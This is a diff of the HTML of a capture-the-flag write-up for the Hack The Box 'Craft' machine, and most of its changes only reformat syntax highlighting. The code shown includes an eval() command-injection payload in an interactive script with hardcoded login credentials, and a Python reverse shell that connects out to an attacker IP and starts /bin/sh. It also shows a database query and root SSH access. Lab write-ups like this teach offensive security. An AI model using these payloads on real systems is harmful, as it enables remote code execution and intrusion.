@@ -90,7 +90,7 @@ $ nmap -sV -sT -sC craft.htb Starting Nmap 7."/>
     
     <li>
 <a href="/search" title="Search">
-<img src="/icon/search.svg" alt="search" height="24">
+<img src="/icon/search.svg" alt="search" height="20">
 </a>
 <li>
   </ul>
@@ -247,19 +247,19 @@ If this search don&rsquo;t give any results I will move on to SQL injection and 
 <p>The most common way command injection vulnerability get introduced in Python is by the <code>eval()</code> function which is used to run the python code (which is passed as an argument) within the program.</p>
 <p>A quick <code>grep</code> will tell us if such function is used within the API:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ grep -ri <span style="color:#e6db74">&#34;eval&#34;</span> craft-api
-craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9ef">if</span> eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;%s &gt; 1&#39;</span> % request.json<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;abv&#39;</span><span style="color:#f92672">]</span><span style="color:#f92672">)</span>:
+craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9ef">if</span> eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;%s &gt; 1&#39;</span> % request.json<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;abv&#39;</span><span style="color:#f92672">])</span>:
 </code></pre></div><p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p>
 <p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@auth.auth_required</span>
 <span style="color:#a6e22e">@api.expect</span>(beer_entry)
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>(self):
-<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">Creates a new brew entry.</span><span style="color:#e6db74">
-</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+<span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">Creates a new brew entry.
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
 
 <span style="color:#75715e"># make sure the ABV value is sane.</span>
-<span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>]):
-    <span style="color:#66d9ef">return</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ABV must be a decimal value less than 1.0</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">400</span>
+<span style="color:#66d9ef">if</span> eval(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> &gt; 1&#39;</span> <span style="color:#f92672">%</span> request<span style="color:#f92672">.</span>json[<span style="color:#e6db74">&#39;abv&#39;</span>]):
+    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;ABV must be a decimal value less than 1.0&#34;</span>, <span style="color:#ae81ff">400</span>
 <span style="color:#66d9ef">else</span>:
     create_brew(request<span style="color:#f92672">.</span>json)
     <span style="color:#66d9ef">return</span> None, <span style="color:#ae81ff">201</span>
@@ -276,7 +276,7 @@ $ curl -H <span style="color:#e6db74">&#34;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLC
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
 </code></pre></div><p>We are authenticated! Note here that this API doesn&rsquo;t use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that&rsquo;s why taking time to read the code and understanding the inner workings of the app is important.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># craft_api/api/auth/endpoints/auth.py</span>
-token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">X-Craft-Api-Token</span><span style="color:#e6db74">&#39;</span>]
+token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;X-Craft-Api-Token&#39;</span>]
 </code></pre></div><p>We have now all the needed information to perform our command injection.</p>
 <p>Since we need to authenticate and perform multiple queries on the <code>brew</code> endpoint I decided to write a script to avoid writing a thousand curl request.</p>
 <p>No need to start from scratch since <code>craft-api/tests/test.py</code> already provide a solid base. I tweaked it a little to end up with this script :</p>
@@ -286,26 +286,26 @@ token <span style="color:#f92672">=</span> request<span style="color:#f92672">.<
 <span style="color:#f92672">import</span> urllib3
 urllib3<span style="color:#f92672">.</span>disable_warnings(urllib3<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InsecureRequestWarning)
 
-response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/auth/login</span><span style="color:#e6db74">&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">dinesh</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4aUh0A8PbVJxgd</span><span style="color:#e6db74">&#39;</span>), verify<span style="color:#f92672">=</span>False)
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/login&#39;</span>,  auth<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span>), verify<span style="color:#f92672">=</span>False)
 json_response <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(response<span style="color:#f92672">.</span>text)
-token <span style="color:#f92672">=</span> json_response[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">token</span><span style="color:#e6db74">&#39;</span>]
+token <span style="color:#f92672">=</span> json_response[<span style="color:#e6db74">&#39;token&#39;</span>]
 
-headers <span style="color:#f92672">=</span> {<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">X-Craft-API-Token</span><span style="color:#e6db74">&#39;</span>: token, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Content-Type</span><span style="color:#e6db74">&#39;</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">application/json</span><span style="color:#e6db74">&#39;</span>}
+headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;X-Craft-API-Token&#39;</span>: token, <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>}
 
-response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/auth/check</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
+response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;https://api.craft.htb/api/auth/check&#39;</span>, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span>False)
 <span style="color:#66d9ef">print</span>(response<span style="color:#f92672">.</span>text)  <span style="color:#75715e"># make sure token is valid</span>
 
 <span style="color:#66d9ef">while</span> True:
-    cmd <span style="color:#f92672">=</span> input(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>)
+    cmd <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#39;&gt; &#39;</span>)
 
     brew_dict <span style="color:#f92672">=</span> {}
-    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">abv</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__import__(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">os</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).popen(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">).read()</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(cmd)
-    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
-    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">brewer</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
-    brew_dict[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">style</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">bullshit</span><span style="color:#e6db74">&#39;</span>
+    brew_dict[<span style="color:#e6db74">&#39;abv&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;__import__(&#34;os&#34;).popen(&#34;{}&#34;).read()&#39;</span><span style="color:#f92672">.</span>format(cmd)
+    brew_dict[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>
+    brew_dict[<span style="color:#e6db74">&#39;brewer&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>
+    brew_dict[<span style="color:#e6db74">&#39;style&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bullshit&#39;</span>
 
     json_data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(brew_dict)
-    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">https://api.craft.htb/api/brew/</span><span style="color:#e6db74">&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
+    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;https://api.craft.htb/api/brew/&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>json_data, verify<span style="color:#f92672">=</span>False)
 </code></pre></div><p>Since <code>eval()</code> will run any python code we will use this lambda function <code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code> to run an os command from the python code.</p>
 <p>I added a <code>input('&gt; ')</code> so we simply have to type our command to run it on the API. Shell style.</p>
 <p>Unfortunately we don&rsquo;t have any output available, so how are we going to know that our command executed successfully ?</p>
@@ -317,8 +317,8 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 </ul>
 <p>Using the <code>requests</code> library <code>elapsed.total_seconds()</code> function, we can display the time elapsed for the request to success.</p>
 <p>I add it to the script so we can easily see if the <code>sleep 5</code> injection worked fine.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>]
-<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Execution time: {}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(response<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()))
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">...</span>]
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Execution time: {}&#34;</span><span style="color:#f92672">.</span>format(response<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()))
 </code></pre></div><p>Let&rsquo;s it give a try:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
@@ -359,11 +359,11 @@ Execution time: 4.412322
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat hg8.py
 import socket,subprocess,os;
 s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#f92672">)</span>;
-s.connect<span style="color:#f92672">(</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;10.10.10.85&#34;</span>,8585<span style="color:#f92672">)</span><span style="color:#f92672">)</span>;
-os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(</span><span style="color:#f92672">)</span>,0<span style="color:#f92672">)</span>;
-os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(</span><span style="color:#f92672">)</span>,1<span style="color:#f92672">)</span>;
-os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(</span><span style="color:#f92672">)</span>,2<span style="color:#f92672">)</span>;
-p<span style="color:#f92672">=</span>subprocess.call<span style="color:#f92672">(</span><span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#f92672">]</span><span style="color:#f92672">)</span>;
+s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;10.10.10.85&#34;</span>,8585<span style="color:#f92672">))</span>;
+os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,0<span style="color:#f92672">)</span>;
+os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,1<span style="color:#f92672">)</span>;
+os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,2<span style="color:#f92672">)</span>;
+p<span style="color:#f92672">=</span>subprocess.call<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#f92672">])</span>;
 $ python -m http.server
 Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
 </code></pre></div><p>And back to our original terminal let&rsquo;s launch our injection:</p>
@@ -426,7 +426,7 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 
 <span style="color:#66d9ef">try</span>:
     <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
-        sql <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">SELECT table_name FROM information_schema.tables;</span><span style="color:#e6db74">&#34;</span>
+        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT table_name FROM information_schema.tables;&#34;</span>
         cursor<span style="color:#f92672">.</span>execute(sql)
         result <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
         <span style="color:#66d9ef">for</span> row <span style="color:#f92672">in</span> result:
@@ -455,8 +455,8 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 $ ssh gilfoyle@craft.htb -i id_rsa
 
   .   *   ..  . *  *
-*  * @<span style="color:#f92672">(</span><span style="color:#f92672">)</span>Ooc<span style="color:#f92672">(</span><span style="color:#f92672">)</span>*   o  .
-    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">(</span><span style="color:#f92672">)</span>  ___
+*  * @<span style="color:#f92672">()</span>Ooc<span style="color:#f92672">()</span>*   o  .
+    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">()</span>  ___
    |<span style="color:#ae81ff">\_</span>________/|/ _ <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>   |  |  |  |  | / | |
    |  |  |  |  | | | |
@@ -540,8 +540,8 @@ username           root
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh root@craft.htb
 
   .   *   ..  . *  *
-*  * @<span style="color:#f92672">(</span><span style="color:#f92672">)</span>Ooc<span style="color:#f92672">(</span><span style="color:#f92672">)</span>*   o  .
-    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">(</span><span style="color:#f92672">)</span>  ___
+*  * @<span style="color:#f92672">()</span>Ooc<span style="color:#f92672">()</span>*   o  .
+    <span style="color:#f92672">(</span>Q@*0CG*O<span style="color:#f92672">()</span>  ___
    |<span style="color:#ae81ff">\_</span>________/|/ _ <span style="color:#ae81ff">\
 </span><span style="color:#ae81ff"></span>   |  |  |  |  | / | |
    |  |  |  |  | | | |
@@ -619,7 +619,7 @@ root@craft:~# cat root.txt
           &nbsp; 
           <a class="social-icon" href="https://github.com/hg8" target="_blank" rel="noopener" title="Github"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg></a>
           &nbsp;
-          <a class="social-icon" href="https://www.hackthebox.eu/home/users/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
+          <a class="social-icon" href="https://www.hackthebox.eu/profile/128102" target="_blank" rel="noopener" title="hackthebox"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path><polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline><line x1="12" y1="22.08" x2="12" y2="12"></line></svg></a>
           &nbsp; 
           <a class="social-icon" href="https://hg8.rocks/index.xml" target="_blank" rel="noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
         </span>
